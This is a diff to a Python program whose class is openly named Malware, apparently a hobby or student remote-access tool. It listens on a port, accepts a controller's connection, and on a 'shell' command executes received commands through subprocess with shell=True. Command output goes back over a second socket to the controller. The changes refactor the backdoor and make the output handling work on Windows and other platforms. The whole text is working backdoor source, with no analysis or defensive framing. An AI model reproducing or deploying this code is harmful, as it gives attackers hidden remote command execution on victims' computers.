@@ -4,6 +4,7 @@ import socket
 import sys
 import os
 import subprocess
+import platform
 
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -16,17 +17,15 @@ remote_public_key = None
 public_key_pem = None
 private_key = None
 
-IN_PORT = 44455
-OUT_PORT = 44444
-
 
 class InThread(threading.Thread):
-    global OUT_PORT
-    global IN_PORT
+    IN_PORT = 44455
+    OUT_PORT = 44444
 
-    def __init__(self, in_port=IN_PORT):
+    def __init__(self, in_port=IN_PORT, out_port=OUT_PORT):
         super().__init__()
         self.in_port = in_port
+        self.out_port = out_port
         self.socket = socket.socket()
         self.listen()
 
@@ -43,13 +42,14 @@ class InThread(threading.Thread):
         conn, in_ip = self.socket.accept()
         print('connection received')
         #self.init_public_key()
-        malw.start_out_thread(in_ip)
+        cons = OutThread(in_ip, self.out_port)
         again = True
         while again:
             msg = conn.recv(1024).decode('UTF-8')
             print(msg)
             if msg == 'exit':
                 again = False
+                cons.send(msg)
             elif msg == 'shell':
                 comm_again = True
                 while comm_again:
@@ -64,13 +64,19 @@ class InThread(threading.Thread):
                             resp = subprocess.check_output(command.split(), shell=True)
                             print(command)
                             print(resp)
-                            malw.send(resp.decode('cp850'))
+                            if platform.system() == 'Windows':
+                                cons.send(resp.decode('cp850'))
+                            else:
+                                cons.send(resp)
                         except subprocess.CalledProcessError:
-                            malw.send("Impossible d'exécuter cette commande")
+                            cons.send("Impossible d'exécuter cette commande")
             else:
                 pass
-
+        print('stopping threads')
+        cons.stop()
+        #self.socket.shutdown(socket.SHUT_RDWR)
         self.socket.close()
+        print('closed IN')
         print('Closed socket coming from {}'.format(in_ip))
 
     def init_public_key(self):
@@ -95,7 +101,7 @@ class InThread(threading.Thread):
 
 
 class OutThread(threading.Thread):
-    def __init__(self, ip, out_port: int = OUT_PORT):
+    def __init__(self, ip, out_port):
         super().__init__()
         self.ip = ip
         self.out_port = out_port
@@ -103,42 +109,22 @@ class OutThread(threading.Thread):
         try:
             self.sock = socket.socket()
             self.sock.connect((self.ip[0], self.out_port))
-            print('trying to connect to master')
         except ConnectionError:
             print('Unable to connect to {}'.format(self.ip))
 
         #self.send_public_keys()
 
-    def run(self):
-        again = True
-        while again:
-            msg = input('{} > '.format(self.ip))
-            if msg == '':
-                pass
-            elif msg == 'exit':
-                again = False
-                self.send(msg)
-            elif msg == 'shell':
-                keepalive = True
-                while keepalive:
-                    shell = input('{} > shell > '.format(self.ip))
-                    if shell == '':
-                        pass
-                    elif shell == 'exit':
-                        keepalive = False
-                    else:
-                        self.send(shell)
-            elif msg == 'info':
-                send(msg)
-        s.close()
-        print('Terminated connection to {}'.format(self.ip))
-
     def send(self, message):
         try:
             #print('sending', message)
-            self.sock.sendall(message)
+            self.sock.sendall(message.encode('UTF-8'))
         except ConnectionError:
             print('Unable to send <<{}>> to {}'.format(message, self.ip))
+
+    def stop(self):
+        self.sock.shutdown(socket.SHUT_RDWR)
+        self.sock.close()
+        print('closed OUT')
 
     def send_public_keys(self):
         try:
@@ -159,42 +145,27 @@ class OutThread(threading.Thread):
 
 
 class Malware(threading.Thread):
-    global OUT_PORT
-    global IN_PORT
 
-    def __init__(self, out_port=OUT_PORT, in_port=IN_PORT):
+    def __init__(self):
         super().__init__()
-        self.ip = None
-        self.out_port = out_port
-        self.in_port = in_port
 
-        self.prod = InThread(self.in_port)
-        self.cons = None
+        self.prod = InThread()
 
         global private_key
         global public_key_pem
-        #private_key = self.generate_rsa_keys()
-        #public_key_pem = self.serialize_public_key(private_key.public_key())
+        private_key = self.generate_rsa_keys()
+        public_key_pem = self.serialize_public_key(private_key.public_key())
         self.start()
-
-    def start_out_thread(self, out_ip):
-        self.ip = out_ip
-        self.cons = OutThread(self.ip)
+        print('started Malware')
 
     def run(self):
-        #if self.cons.is_alive():
-        #    self.cons.join()
         if self.prod.is_alive():
+            print('waiting for IN to stop')
             self.prod.join()
-
-        self.stop()
-
-    def send(self, message):
-        self.cons.send(message.encode('UTF-8'))
+            print('IN joined MAIN')
 
     def stop(self):
         self.prod.stop()
-        self.cons.stop()
 
     def generate_rsa_keys(self):
         return rsa.generate_private_key(backend=default_backend(),
@@ -209,6 +180,6 @@ class Malware(threading.Thread):
 
 while True:
     malw = Malware()
-    while malw.is_alive():
-        time.sleep(10)
+    time.sleep(2)
+    malw.join()
 
